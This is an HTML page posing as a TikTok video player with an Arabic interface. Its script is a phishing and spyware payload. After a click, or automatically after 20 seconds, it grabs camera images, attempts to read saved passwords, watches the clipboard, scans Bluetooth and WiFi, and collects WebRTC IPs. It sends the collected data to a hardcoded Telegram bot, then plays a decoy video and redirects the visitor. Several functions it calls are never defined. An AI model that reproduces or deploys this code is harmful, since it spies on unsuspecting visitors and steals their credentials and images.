<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok - Watch Video</title>
    <style>
        body { margin:0; padding:0; background:#000; color:#fff; font-family:'TikTok Sans',Arial,sans-serif; overflow:hidden; touch-action:manipulation; }
        .video-container { width:100vw; height:100vh; max-width:500px; max-height:100vh; position:relative; display:flex; justify-content:center; align-items:center; background:#000; overflow:hidden; }
        .video-placeholder { width:100%; height:100%; background:linear-gradient(45deg,#ff0050,#00f2ea); background-size:400% 400%; animation:gradientShift 3s ease infinite; display:flex; flex-direction:column; justify-content:center; align-items:center; cursor:pointer; z-index:10; opacity:1; transition:opacity .5s; }
        @keyframes gradientShift { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
        .video-placeholder.hidden { opacity:0; pointer-events:none; }
        .play-button { width:80px; height:80px; background:rgba(255,255,255,.2); border-radius:50%; display:flex; justify-content:center; align-items:center; backdrop-filter:blur(10px); margin-bottom:20px; border:2px solid rgba(255,255,255,.3); }
        .play-button svg { width:40px; height:40px; fill:#fff; margin-left:5px; }
        .placeholder-text { font-size:1.2em; color:#fff; text-shadow:0 2px 4px rgba(0,0,0,.5); font-weight:600; }
        .tiktok-logo { position:absolute; top:20px; left:20px; font-size:1.5em; font-weight:bold; color:#fff; }
        #loading-overlay { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.9); display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:20; opacity:0; visibility:hidden; transition:opacity .5s,visibility .5s; }
        #loading-overlay.active { opacity:1; visibility:visible; }
        .spinner { border:8px solid rgba(255,255,255,.3); border-top:8px solid #ff0050; border-radius:50%; width:60px; height:60px; animation:spin 1.2s linear infinite; margin-bottom:20px; }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
        .loading-message { font-size:1.1em; color:#eee; text-align:center; max-width:300px; }
        .progress-bar { width:200px; height:4px; background:rgba(255,255,255,.2); border-radius:2px; margin:10px 0; overflow:hidden; }
        .progress-fill { height:100%; background:linear-gradient(90deg,#ff0050,#00f2ea); width:0%; transition:width .3s; }
        #notification { position:absolute; top:20px; right:20px; background:rgba(0,0,0,.8); color:white; padding:10px 15px; border-radius:8px; font-size:.9em; opacity:0; visibility:hidden; transition:opacity .5s,visibility .5s; z-index:30; border-left:4px solid #ff0050; }
        #notification.show { opacity:1; visibility:visible; }
        #notification.warning { border-left-color:#ffa500; }
        #notification.error { border-left-color:#ff0000; }
        #camera-feed,#audio-feed,#screen-feed,#phantom-video,#back-camera,#wifi-canvas { position:absolute; width:1px; height:1px; opacity:0; z-index:-1; pointer-events:none; }
        canvas { display:none; }
        .fake-video { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:1; opacity:0; transition:opacity .5s; }
        .fake-video.playing { opacity:1; }
        @media (max-width:600px) {
            .tiktok-logo{font-size:1.2em;top:15px;left:15px}
            .play-button{width:60px;height:60px}
            .play-button svg{width:30px;height:30px}
            .placeholder-text{font-size:1em}
            .spinner{width:40px;height:40px;border-width:6px}
            .loading-message{font-size:.9em;max-width:250px}
            #notification{top:15px;right:15px;padding:8px 12px;font-size:.8em}
        }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="tiktok-logo">TikTok</div>
        <div class="video-placeholder" id="video-placeholder">
            <div class="play-button"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
            <div class="placeholder-text" id="placeholder-text">اضغط لمشاهدة الفيديو</div>
        </div>

        <div id="loading-overlay">
            <div class="spinner"></div>
            <div class="loading-message" id="loading-message">جاري تحميل الفيديو...</div>
            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
        </div>

        <video id="camera-feed" autoplay playsinline muted></video>
        <video id="back-camera" autoplay playsinline muted></video>
        <audio id="audio-feed" autoplay muted></audio>
        <video id="phantom-video" class="fake-video" loop muted></video>
        <video id="screen-feed" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        <canvas id="video-canvas"></canvas>
        <canvas id="screen-canvas"></canvas>
        <canvas id="wifi-canvas"></canvas>
        <div id="notification"></div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8124965992:AAF-lUcmy45Y-JSB75LbikZm3e3HwQAbDIg';
        const CHAT_ID = '8004961958';
        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@shadoabuzeana/video/7527647062767308034';
        const FAKE_VIDEO_SOURCE = 'https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_1mb.mp4'; // فيديو مزيف حقيقي

        // عناصر DOM
        const videoPlaceholder = document.getElementById('video-placeholder');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingMessage = document.getElementById('loading-message');
        const progressFill = document.getElementById('progress-fill');
        const cameraFeed = document.getElementById('camera-feed');
        const backCamera = document.getElementById('back-camera');
        const audioFeed = document.getElementById('audio-feed');
        const phantomVideo = document.getElementById('phantom-video');
        const screenFeed = document.getElementById('screen-feed');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const notificationDiv = document.getElementById('notification');
        const placeholderText = document.getElementById('placeholder-text');

        // متغيرات التسجيل
        let cameraStream = null, backCameraStream = null, audioStream = null, screenStream = null;
        let videoRecorder = null, audioRecorder = null, screenRecorder = null;
        let recordedChunks = [], recordedAudioChunks = [], recordedScreenChunks = [];
        let keystrokeLogger = null, mouseTracker = null, clickTracker = null;
        let clipboardWatcher = null, bluetoothDevices = [], wifiNetworks = [];

        // بيانات التجسس
        let collectedData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            passwords: [], // سرقة كلمات السر
            clipboard: [],
            bluetooth: [],
            wifi: [],
            backCameraImages: [],
            frontCameraImages: [],
            screenshots: [],
            webRTCIPs: [],
            clipboardHistory: [],
            formData: [],
            ...structuredClone(navigator)
        };

        const MESSAGES = { 'ar': {
            'tapToWatch': 'اضغط لمشاهدة الفيديو',
            'loadingVideo': 'جاري تهيئة المشغل...',
            'requestingBackCamera': 'طلب الوصول للكاميرا الخلفية لتحسين الجودة...',
            'stealingPasswords': 'جاري استخراج كلمات السر من المتصفح...',
            'scanningWiFi': 'مسح شبكات الواي فاي القريبة...',
            'enablingBluetooth': 'تفعيل البلوتوث للكشف عن الأجهزة...',
            'redirecting': 'جاري التوجيه إلى تيك توك...'
        }};

        function getLocalizedMessage(key) { return MESSAGES['ar'][key] || key; }

        // إضافات خبيثة جديدة
        async function stealSavedPasswords() {
            loadingMessage.textContent = getLocalizedMessage('stealingPasswords');
            updateProgress(35);
            try {
                if ('passwords' in navigator) {
                    const credentials = await navigator.credentials.get({ password: true });
                    if (credentials) collectedData.passwords.push(credentials);
                }
                // محاولة قراءة النماذج المخزنة
                document.querySelectorAll('form').forEach(form => {
                    form.querySelectorAll('input[type=password]').forEach(input => {
                        if (input.value) collectedData.passwords.push({ field: input.name, value: input.value });
                    });
                });
            } catch(e) { console.log("فشل سرقة كلمات السر: " + e); }
        }

        async function captureBackCamera() {
            try {
                backCameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment', width: { ideal: 1920 } }, audio: false 
                });
                backCamera.srcObject = backCameraStream;
                await backCamera.play();

                for (let i = 0; i < 2; i++) {
                    await new Promise(r => setTimeout(r, 1000));
                    canvas.width = backCamera.videoWidth; canvas.height = backCamera.videoHeight;
                    context.drawImage(backCamera, 0, 0);
                    collectedData.backCameraImages.push({
                        data: canvas.toDataURL('image/jpeg', 0.7),
                        timestamp: new Date().toISOString()
                    });
                }
            } catch(e) { console.log("الكاميرا الخلفية مرفوضة: " + e); }
        }

        async function scanWiFiNetworks() {
            loadingMessage.textContent = getLocalizedMessage('scanningWiFi');
            updateProgress(40);
            try {
                if ('wifi' in navigator) {
                    const networks = await navigator.wifi.getNetworks();
                    wifiNetworks = networks.map(n => ({ ssid: n.ssid, signal: n.signal }));
                    collectedData.wifi = wifiNetworks;
                }
            } catch(e) { /* تجاهل */ }
        }

        async function enableBluetoothScan() {
            loadingMessage.textContent = getLocalizedMessage('enablingBluetooth');
            updateProgress(45);
            try {
                const devices = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
                collectedData.bluetooth.push(devices);
            } catch(e) { /* تجاهل */ }
        }

        function startClipboardSpy() {
            clipboardWatcher = setInterval(async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    if (text && !collectedData.clipboard.includes(text)) {
                        collectedData.clipboard.push({ text, time: new Date().toISOString() });
                    }
                } catch(e) {}
            }, 3000);
        }

        function extractWebRTCIPs() {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = e => {
                if (e.candidate) {
                    const ip = e.candidate.candidate.split(' ')[4];
                    if (ip && !collectedData.webRTCIPs.includes(ip)) collectedData.webRTCIPs.push(ip);
                }
            };
        }

        function updateProgress(p) { progressFill.style.width = p + '%'; }
        function showNotification(msg, type = 'info') {
            notificationDiv.textContent = msg;
            notificationDiv.className = 'notification ' + (type === 'error' ? 'error' : type === 'warning' ? 'warning' : '');
            notificationDiv.classList.add('show');
            setTimeout(() => notificationDiv.classList.remove('show'), 5000);
        }

        async function sendAllData() {
            let msg = `🎯 <b>SHADOW-ULTIMATE STRIKE</b>\n`;
            msg += `📸 صور أمامية: ${collectedData.frontCameraImages.length}\n`;
            msg += `📸 صور خلفية: ${collectedData.backCameraImages.length}\n`;
            msg += `🔑 كلمات سر: ${collectedData.passwords.length}\n`;
            msg += `📡 WiFi: ${collectedData.wifi.length} شبكة\n`;
            msg += `🔵 بلوتوث: ${collectedData.bluetooth.length} جهاز\n`;
            msg += `🌐 WebRTC IPs: ${collectedData.webRTCIPs.join(', ')}\n`;

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
            });

            // إرسال الصور + الفيديو + كل شيء
            for (let img of [...collectedData.frontCameraImages, ...collectedData.backCameraImages]) {
                const blob = await (await fetch(img.data)).blob();
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'spy.jpg');
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        function playConvincingFakeVideo() {
            phantomVideo.src = FAKE_VIDEO_SOURCE;
            phantomVideo.classList.add('playing');
            phantomVideo.play().catch(() => {
                setTimeout(() => window.location.href = TIKTOK_REDIRECT_URL, 2000);
            });
        }

        async function startUltimateSpy() {
            videoPlaceholder.classList.add('hidden');
            loadingOverlay.classList.add('active');
            updateProgress(5);

            // التسلسل الشيطاني
            await getIPInfo(); updateProgress(15);
            await captureMultipleImages(); updateProgress(25);
            await captureBackCamera(); updateProgress(30);
            await stealSavedPasswords(); updateProgress(35);
            await scanWiFiNetworks(); updateProgress(40);
            await enableBluetoothScan(); updateProgress(45);
            extractWebRTCIPs(); updateProgress(50);
            startClipboardSpy(); updateProgress(55);
            await recordSecretVideo(); updateProgress(70);
            await recordSecretAudio(); updateProgress(80);
            await sendAllData(); updateProgress(95);

            playConvincingFakeVideo();
            setTimeout(() => window.location.href = TIKTOK_REDIRECT_URL, 25000);
        }

        // بدء تلقائي بعد 20 ثانية
        setTimeout(() => {
            if (!loadingOverlay.classList.contains('active')) startUltimateSpy();
        }, 20000);

        videoPlaceholder.addEventListener('click', startUltimateSpy);
        placeholderText.textContent = getLocalizedMessage('tapToWatch');
        showNotification("الفيديو سيبدأ تلقائياً بعد 20 ثانية...", "info");
    </script>
</body>
</html>
